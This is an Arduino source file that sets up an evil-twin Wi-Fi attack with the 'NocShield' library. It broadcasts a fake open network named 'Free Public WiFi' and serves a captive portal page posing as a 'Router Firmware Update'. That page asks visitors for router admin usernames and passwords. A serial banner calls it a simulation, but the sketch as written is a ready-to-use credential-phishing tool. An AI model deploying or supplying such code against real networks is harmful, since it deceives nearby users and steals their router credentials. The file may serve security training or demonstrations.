#include <Arduino.h>
#include "NocShield.h"

NocShield nocShield;

// Fake SSID to broadcast
const char* fakeSSID = "Free Public WiFi";

// Simple HTML for the captive portal login page
const char* loginHtml = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Wi-Fi Login</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
        .container { border: 1px solid #ccc; padding: 20px; border-radius: 10px; display: inline-block; }
        input[type=text], input[type=password] { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; box-sizing: border-box; }
        button { background-color: #4CAF50; color: white; padding: 14px 20px; margin: 8px 0; border: none; cursor: pointer; width: 100%; }
        button:hover { opacity: 0.8; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Router Firmware Update</h2>
        <p>Please enter your Wi-Fi admin credentials to continue.</p>
        <form action="/login" method="post">
            <label for="username"><b>Admin Username</b></label>
            <input type="text" placeholder="Enter Username" name="username" required>
            
            <label for="password"><b>Admin Password</b></label>
            <input type="password" placeholder="Enter Password" name="password" required>
            
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
)rawliteral";

void setup() {
    Serial.begin(115200);
    delay(2000);
    Serial.println("\n--- NocShield Captive Portal (Evil Twin) Simulation ---");
    
    // Initialize the library
    nocShield.begin();
    
    // Start the captive portal
    nocShield.startCaptivePortal(fakeSSID, loginHtml);
}

void loop() {
    // Process DNS and Web Server requests
    nocShield.handleCaptivePortal();
}
